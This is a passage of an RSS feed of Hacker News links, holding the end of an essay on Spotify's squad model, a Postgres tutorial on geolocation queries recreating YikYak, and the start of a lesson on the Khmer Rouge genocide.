<p>The Spotify model was documented when Spotify was a much smaller company. It was supposed to be a multiple part series, according to Anders Ivarsson. Autonomy made the first cut, but the parts on alignment and accountability were never completed.</p>
</div>
</section>
<section>
<div>
<p><strong>Learn from Spotify’s mistakes:</strong></p>
<ul>
<li>Autonomy requires alignment. Company priorities must be defined by leadership. Autonomy does not mean teams get to do whatever they want.</li>
<li>Processes for cross-team collaboration must be defined. Autonomy does not mean leaving teams to self-organize every problem.</li>
<li>How success is measured must be defined by leadership so people can effectively negotiate cross-team dependency prioritization.</li>
<li>Autonomy requires accountability. Product management is accountable for value. The team is accountable for delivering ‘done’ increments. Mature teams can justify their independence with their ability to articulate business value, risk, learning, and the next optimal move.<sup><a href="#6">6</a></sup></li>
</ul>
</div>
</section>
</section>
<!-- Spread 7 -->
<section>
<section id="too-much-autonomy">
<div>
<blockquote>
<p>“If I were to do one thing differently, I would say we should not be focusing so much on autonomy.</p>
<p>“Every time you have a new team, they have to reinvent the wheel in how they should be working. Maybe, just maybe, we should have a ‘minimum viable agility’. You start with that. You are free to opt out, but people shouldn’t have to opt-in all the time.</p>
<p>“At what point do you start inserting this process? Probably when it’s too late.”</p>
</blockquote>
<p>—Joakim Sundén, agile coach at Spotify<sup><a href="#4">4</a></sup></p>
</div>
</section>
<section>
<div>
<blockquote>
<p>“Henrik Kniberg talked about how we're not that good at large initiatives and we’re still not that good at large initiatives.</p>
<p>“If you have inconsistent ways of working, it’s more difficult for people to move. If it’s more difficult for people to move, it’s more likely you have inconsistent ways of working. It will just reinforce until all of a sudden, you’re not really working for the same company anymore. You’re working for these kind of weird subcultures.”</p>
</blockquote>
<p>—Jason Yip, agile coach at Spotify<br>2015–time of writing<sup><a href="#5">5</a></sup></p>
</div>
</section>
</section>
<!-- Spread 8 -->
<section>
<section id="collaboration-is-a-competency">
<div>
<h3>Collaboration was an assumed competency</h3>
<p>While Spotify gave teams control over their way of working, many people did not have a basic understanding of Agile practices. This resulted in teams iterating through process tweaks in blind hope of finding the combination that would help them improve their delivery. People lacked a common language to effectively discuss the process problems, the education to solve them, and the experience to evaluate performance. It was not really <em>agile</em>. It was just <em>not-waterfall</em>.</p>
<p><em>“Agile coaches”</em> were internal consultants Spotify provided teams to teach and suggest process improvements. While well-intentioned, there were not enough coaches to help every team. A coach’s engagement with a team was rarely long enough to span a project’s completion to help a team evaluate performance. More so, they were not accountable for anything.</p>
</div>
</section>
<section>
<div>
<blockquote>
<p>“Control without competence is chaos.”</p>
</blockquote>
<p>—L. David Marquet, <a href="https://www.indiebound.org/book/9781591846406"><cite>Turn the Ship Around!</cite></a></p>
<p><strong>Learn from Spotify’s …</strong></p></div></section></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jeremiahlee.com/posts/failed-squad-goals/?hn">https://www.jeremiahlee.com/posts/failed-squad-goals/?hn</a></em></p>]]>
            </description>
            <link>https://www.jeremiahlee.com/posts/failed-squad-goals/?hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-23837535</guid>
            <pubDate>Tue, 14 Jul 2020 20:40:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Recreating YikYak with Postgres]]>
            </title>
            <description>
<![CDATA[
Score 81 | Comments 23 (<a href="https://news.ycombinator.com/item?id=23837269">thread link</a>) | @AJRF
<br/>
July 14, 2020 | https://adamfallon.com/2020/07/10/recreating-yikyak-with-postgres/ | <a href="https://web.archive.org/web/*/https://adamfallon.com/2020/07/10/recreating-yikyak-with-postgres/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Yik_Yak" target="_blank">YikYak</a> was an anonymous social network that used your location to show you posts 5km around you.  Users of the app could create new posts and the people around them could view the posts and vote up or down.</p>



<p>YikYak filed a few patents for the tech that helped them achieve this. The patents mention segmenting users into buckets by their physical location. One modern tool we have to recreate this type of user segmentation is a data-structure called an <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/R*_tree" target="_blank">R-Tree</a>. </p>



<figure><img data-attachment-id="154" data-permalink="https://adamfallon.com/1rsz300nanspcxrd2bu5sqw/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?fit=2000%2C873&amp;ssl=1" data-orig-size="2000,873" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1rsz300nanspcxrd2bu5sqw" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?fit=300%2C131&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?fit=580%2C253&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption><em>An example on an R-Tree in action</em></figcaption></figure>



<p>R-trees&nbsp;are&nbsp;tree data structures&nbsp;used for&nbsp;spatial access methods, i.e., for indexing multi-dimensional information such as&nbsp;<strong>geographical coordinates</strong>,&nbsp;rectangles&nbsp;or&nbsp;polygons.</p>



<p>Luckily the Postgres database enables us to make use of this data-structure via geospatial extensions. In this post I am going to;</p>



<ol><li>Show how we can enable those extensions.</li><li>Seed a few posts into our database.</li><li>Find the posts in a small around a specific latitude and longitude using a SQL query.</li></ol>



<p>Let’s get started!</p>



<hr>



<h2>Creating tables.</h2>



<p>Firstly you will need an instance of Postgres. It is easy to set up in Docker (I’ve detailed a post <a rel="noreferrer noopener" href="https://adamfallon.com/2020/07/08/postgres-in-docker/" target="_blank">here</a> showing how). </p>



<p>I am going to be using DBeaver for this tutorial but you could use psql or any other Postgres connector. Let’s creating a new table for our posts.</p>



<div><figure><img data-attachment-id="207" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-09-32-15/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?fit=2560%2C296&amp;ssl=1" data-orig-size="2560,296" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-09.32.15" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?fit=300%2C35&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?fit=580%2C67&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption><em>Select the SQL Editor</em></figcaption></figure></div>



<div><figure><img data-attachment-id="209" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-09-32-36/" data-orig-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?fit=829%2C339&amp;ssl=1" data-orig-size="829,339" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-09.32.36" data-image-description="" data-medium-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?fit=300%2C123&amp;ssl=1" data-large-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?fit=580%2C237&amp;ssl=1" src="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption><em>Chose whatever Database you want. I am going with Postgres</em></figcaption></figure></div>



<div><figure><img data-attachment-id="210" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-09-33-04/" data-orig-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?fit=1090%2C682&amp;ssl=1" data-orig-size="1090,682" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-09.33.04" data-image-description="" data-medium-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?fit=300%2C188&amp;ssl=1" data-large-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?fit=580%2C363&amp;ssl=1" src="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption><em>Name your script</em></figcaption></figure></div>



<p>Ready to go – So below we have a simple example of table for storing new posts. I am using a split latitude and longitude to show how the extensions work, but you could also combine the two into a POINT datatype if you are planning to use a lot of columns.</p>



<pre>CREATE TABLE post (
	id int8 NOT NULL GENERATED ALWAYS AS IDENTITY,
	post_content text NOT NULL,
	latitude float8 NOT NULL,
	longitude float8 NOT NULL
);</pre>



<p>On executing that you should have a table you can start insert values into. </p>



<h2>Inserting posts.</h2>



<p>So let’s start out by inserting two posts, the first posted from 10 Downing Street, and the second from Buckingham Palace.</p>



<pre>INSERT INTO post VALUES (
	default,
	'I absolutely love the Queen. I hope she thinks I am doing a good job.',
	51.5034,
	0.1276
);
INSERT INTO post VALUES (
	default,
	'The new Prime Minister is a prat! I do hope he doesnt come over often',
	51.5014,
	0.1419
);</pre>



<p>Now let’s put another post in from an aspiring politics student who is located in Cambridge University (65 miles away). Now we have an outlier that won’t show up once we do location bound queries later in this tutorial.</p>



<pre>INSERT INTO post VALUES (
	default,
	'Day one of my politics degree. Shall be most fun to stalk the halls of Westminister in 4 years.',
	52.2053,
	0.1218
);</pre>



<h2>Installing Postgres extensions</h2>



<p>We would like to be able to stand in St. James park (a large park between 10 Downing Street and Buckingham Palace) and see the two posts close by, but not the one from Cambridge.</p>



<p>So how do we do that? Through extensions! Postgres enables users to incrementally add features that help us do new things with our data.</p>



<p>Once they are installed we can use the latitude and longitude of <em>51.5032, -0.1349</em> to create a new select query on our posts table.</p>



<div data-amp-noloading="true" data-amp-lightbox="true"><figure><img data-attachment-id="217" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-09-55-52/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?fit=2560%2C1382&amp;ssl=1" data-orig-size="2560,1382" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-09.55.52" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?fit=300%2C162&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?fit=580%2C313&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>You can install extensions in Postgres simply by running a query. The two extensions we need are <strong><em>cube</em></strong> and <strong><em>earthdistance</em></strong>.</p>



<pre>CREATE EXTENSION IF NOT EXISTS cube;
CREATE EXTENSION IF NOT EXISTS earthdistance;</pre>



<p>After executing those two queries, you should see them under the ‘Extensions’ tab in DBeaver.</p>



<div><figure><img data-attachment-id="219" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-10-24-18/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?fit=652%2C190&amp;ssl=1" data-orig-size="652,190" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-10.24.18" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?fit=300%2C87&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?fit=580%2C169&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<h2>Finding nearby posts.</h2>



<p>We can now use these built in functions from those extensions to show us the two nearby posts.</p>



<pre>SELECT * FROM post
WHERE 
	earth_box(ll_to_earth(51.5032,-0.1349), 50000) 
	@&gt; ll_to_earth(latitude, longitude);</pre>



<p>The earth_box function takes two parameters, a point (which is returned by the ll_to_earth function) and a value for the size of the bounding box we want which is in metres. </p>



<p>By using the <a aria-label="undefined (opens in a new tab)" href="https://www.postgresql.org/docs/current/functions-geometry.html" target="_blank" rel="noreferrer noopener nofollow">contains?</a> operator (@&gt;) we are saying we only want values in the table in the bounding box generated by the earth_box function.</p>



<p>When executing that query we will see the two posts we were expecting! Try increasing the bounding box range out and you will be able to see the Cambridge post.</p>



<div><figure><img data-attachment-id="223" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-10-30-11/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?fit=2558%2C1516&amp;ssl=1" data-orig-size="2558,1516" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-10.30.11" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?fit=300%2C178&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?fit=580%2C344&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>So now we have a working example of how to recreate the YikYak location-based functionality.</p>



<h2>So…how?</h2>



<p>Okay so why did we need those extensions? Can’t we just take the world, split it into squares and determine which box a latitude and longitude falls into? </p>



<p>Thats what we would <em>like</em> to do – but there are complications caused by the fact that the world is a sphere. To find posts “in your area” you are querying to find straight line distances between two points, your lat-long and for each row in the database. In a sphere there are no straight lines. </p>



<p>There is a way to determine the distance between two points known as the <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Great-circle_distance#:~:text=The%20great%2Dcircle%20distance%20or,line%20through%20the%20sphere's%20interior)." target="_blank" rel="noreferrer noopener nofollow">Great-Circle distance</a>. Instead of using straight lines we use circles or curves known as geodesics. Through any two points on a sphere that are not&nbsp;<a href="https://en.wikipedia.org/wiki/Antipodal_point">directly opposite each other</a>, there is a unique great circle. </p>



<p>The earthdistance extension allows us to generate queries using the contains? operator from the cube extension to generate efficient distance lookups between points.</p>



<h2>Conclusion</h2>



<p>One thing to note is that this query will do a sequential scan of the entire table, which can be slow once you get up to thousands of posts. </p>



<p>If you do decide to use this setup in your application you should create an index on the latitude, longitude to dramatically speed up queries. That would look like this.</p>



<pre>CREATE INDEX loc_index ON post USING gist (ll_to_earth(latitude, longitude));</pre>



<p>Postgres will then determine whether it needs to use this index to speed up queries. You can check if the index is being used by using a tool to view the execution plan when you run the query detailed above. If it says SEQ_SCAN it is not using the index. </p>



<p>And we’re done! If you’ve noticed any mistakes or improvements I can make please drop me an email at adam@adamfallon.com</p>

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://adamfallon.com/2020/07/10/recreating-yikyak-with-postgres/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23837269</guid>
            <pubDate>Tue, 14 Jul 2020 20:18:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Khmer Rouge: Genocide in the Name of Utopia (2016)]]>
            </title>
            <description>
<![CDATA[
Score 180 | Comments 176 (<a href="https://news.ycombinator.com/item?id=23836985">thread link</a>) | @exolymph
<br/>
July 14, 2020 | https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/ | <a href="https://web.archive.org/web/*/https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<h5><strong>How is history used to support ideology? Is violence by a government against its own civilian population ever justified? Why are certain events given priority over others in history books?</strong></h5>
<h5><strong>This lesson was reported from:</strong></h5>

<h6>Adapted in part from open sources.</h6>

<figure data-shortcode="caption" id="attachment_464" aria-describedby="caption-attachment-464"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg"><img data-attachment-id="464" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/skulls_2584193k/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg" data-orig-size="858,536" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Evidence for genocide in Cambodia." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=820" src="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=581&amp;h=362" alt="Evidence for genocide in Cambodia." width="581" height="362" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=579&amp;h=362 579w, https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=150&amp;h=94 150w, https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=300&amp;h=187 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=768&amp;h=480 768w, https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg 858w" sizes="(max-width: 581px) 100vw, 581px"></a><figcaption id="caption-attachment-464">Evidence for genocide in Cambodia.</figcaption></figure>
<p><!--block-->The Khmer Rouge was formed in 1968 as a revolutionary Communist party in Cambodia. It was the <a href="https://en.wikipedia.org/wiki/Ruling_party">ruling party</a> in Cambodia from 1975 to 1979, led by <a href="https://en.wikipedia.org/wiki/Pol_Pot">Pol Pot</a>. <a href="https://en.wikipedia.org/wiki/Democratic_Kampuchea">Democratic Kampuchea</a> was the name of the state as controlled by the government of the Khmer Rouge from 1975 to 1979.</p>
<p><!--block-->The four-year period cost approximately 2 million lives through the combined result of political executions, disease, <a href="https://en.wikipedia.org/wiki/Starvation">starvation</a>, and <a href="https://en.wikipedia.org/wiki/Unfree_labor">forced labor</a>. Due to the large numbers, the deaths during the rule of the Khmer Rouge are commonly known as the Cambodian Holocaust or <a href="https://en.wikipedia.org/wiki/Cambodian_genocide">Cambodian genocide</a>. The Khmer Rouge took power at the end of the <a href="https://en.wikipedia.org/wiki/Cambodian_Civil_War">Cambodian Civil War</a> and were only toppled after the invasion of Cambodia by the neighboring Socialist Republic of <a href="https://en.wikipedia.org/wiki/Vietnam">Vietnam</a> in the <a href="https://en.wikipedia.org/wiki/Cambodian%E2%80%93Vietnamese_War">Cambodian–Vietnamese War</a>.</p>
<h2>Pol Pot and the Revolution</h2>

<p><!--block-->Saloth Sar was born on 19 May 1925, the eighth of nine children and the second of three sons to Pen Saloth and Sok Nem. The family was living in the small fishing village of <a href="https://en.wikipedia.org/wiki/Prek_Sbauv">Prek Sbauv</a>, <a href="https://en.wikipedia.org/wiki/Kampong_Thom_Province">Kampong Thom Province</a> when Cambodia was still a French colony. Pen Saloth was a rice farmer who owned 12 <a href="https://en.wikipedia.org/wiki/Hectare">hectares</a> of land and several buffaloes; the family was considered moderately wealthy by the standards of the day. Although Pen Saloth’s family was of <a href="https://en.wikipedia.org/wiki/Chinese_Cambodian">Sino</a>–<a href="https://en.wikipedia.org/wiki/Khmer_people">Khmer</a> descent and Saloth Sar was named accordingly due to his fair complexion (“Sar” means white in Khmer), the family had already assimilated themselves with mainstream Khmer society by the time Sar was born.</p>
<p><!--block-->In 1935, Saloth Sar left Prek Sbauv to attend the École Miche, a Catholic school in <a href="https://en.wikipedia.org/wiki/Phnom_Penh">Phnom Penh</a>. He lived with his cousin, a woman called Meak, a member of the <a href="https://en.wikipedia.org/wiki/Royal_Ballet_of_Cambodia">Royal Ballet</a>.In 1926, she bore King <a href="https://en.wikipedia.org/wiki/Sisowath_Monivong">Monivong’s</a> son, HRH Prince Sisowath Kusarak. She was given the official title <em>Khun Preah Moneang Bopha Norleak Meak</em>. Saloth Sar stayed with Meak’s household until 1942. His sister Roeung was a <a href="https://en.wikipedia.org/wiki/Concubinage">concubine</a> of King Monivong, so through the two women, he often had cause to visit the <a href="https://en.wikipedia.org/wiki/Royal_Palace,_Phnom_Penh">royal palace</a>.&nbsp; In 1947, he gained admission to the exclusive <a href="https://en.wikipedia.org/wiki/Lyc%C3%A9e_Sisowath">Lycée Sisowath</a>, but was unsuccessful in his studies.</p>
<p><!--block-->As a student in Phnom Penh and later in Paris, Saloth was exposed to anti-colonial, revolutionary, and socialist ideas.&nbsp; He became increasingly radical, outraged by French colonialism, the poverty of his nation compared to France itself, and wealth inequality within Cambodia even after French granted the nation independence in the 1950s.</p>
<p><!--block-->Saloth was a founding member of the Khmer Rouge, a party dedicated to socialist revolution in Cambodia.</p>
<div>
<h2>Ideology</h2>
<figure data-shortcode="caption" id="attachment_470" aria-describedby="caption-attachment-470"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg"><img data-attachment-id="470" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/9660abf16bdbccfcaa829a72aa444922/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg" data-orig-size="634,692" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="A female Khmer Rouge fighter or ‘mit naree’ carries an AK-47 assault rifle, a weapon of Communist revolution the world over." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=275" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=634" src="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=275&amp;h=300" alt="A female Khmer Rouge fighter or 'mit naree' carries an AK-47 assault rifle, a weapon of Communist revolution the world over." width="275" height="300" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=275&amp;h=300 275w, https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=550&amp;h=600 550w, https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=137&amp;h=150 137w" sizes="(max-width: 275px) 100vw, 275px"></a><figcaption id="caption-attachment-470">A female Khmer Rouge fighter or ‘mit naree’ carries an AK-47 assault rifle, a weapon of Communist revolution the world over.</figcaption></figure>
